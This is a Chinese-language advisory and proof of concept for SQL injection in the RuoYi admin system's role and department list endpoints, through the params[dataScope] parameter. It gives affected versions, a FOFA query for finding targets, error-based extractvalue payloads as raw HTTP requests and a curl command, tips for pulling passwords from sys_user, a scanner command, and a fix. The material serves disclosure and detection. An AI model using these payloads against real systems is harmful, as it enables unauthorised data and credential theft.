# 若依管理系统 SQL注入（params[dataScope]）

## 漏洞描述

若依管理系统（RuoYi）的列表查询接口 `/system/role/list`（及 `/system/dept/list`）在处理
数据权限参数 `params[dataScope]` 时，将其直接拼接进 SQL 语句（MyBatis `${params.dataScope}`
方式，未经参数化），存在 SQL 注入。攻击者可通过报错注入（extractvalue）读取数据库信息。

注入点位于 MyBatis 映射文件 `SysRoleMapper.xml` / `SysDeptMapper.xml` 的 `${params.dataScope}`。

## 漏洞影响

```
RuoYi >= 4.0, < 4.6
```

（4.6.0 版本对 `params[dataScope]` 做了白名单校验修复）

## 网络测绘

```
app="若依-管理系统"
```

## 漏洞复现

登录后台后（或接口未鉴权可达时），向 `/system/role/list` 发送构造的 `params[dataScope]` 参数：

```
POST /system/role/list HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Accept: application/json

params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))
```

响应（HTTP 500，报错注入特征）：

```
XPATH syntax error: '~ruoyi~'
```

`~` 之间的内容即为 `database()` 查询结果。将 `(select database())` 替换为其他子查询
（如 `(select user())`、`(select password from sys_user limit 0,1)`）可继续读取敏感数据。

部门列表接口 `/system/dept/list` 存在相同问题：

```
POST /system/dept/list HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))
```

### 修复方案

- 升级至 RuoYi 4.6.0+
- 代码层面：对 `dataScope` 做白名单校验，禁止 `extractvalue` / `updatexml` / `concat` 等敏感函数
- WAF 层面：拦截 `dataScope` 参数中的 SQL 注入特征

## 漏洞POC

```bash
# 报错注入读取当前数据库名
curl -X POST "http://target/system/role/list" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -d 'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))'
# 预期：HTTP 500 + 响应含 "XPATH syntax error: '~数据库名~'"
```

批量检测可使用 [ruoyi-scan](https://github.com/xiabai2008/ruoyi-scan)（若依专项扫描器，三态判定）：

```bash
ruoyi-scan -p http://target/ --cms ruoyi
```

## 参考链接

- RuoYi 官方仓库：https://github.com/yangzongzhuan/RuoYi
- PeiQi 文库 - 若依管理系统 SQL 注入：https://github.com/PeiQi0/PeiQi-WIKI-Book
- ruoyi-scan 检测插件（本 POC 来源）：
  https://github.com/xiabai2008/ruoyi-scan/blob/main/plugins/ruoyi/sql_inject_role.py
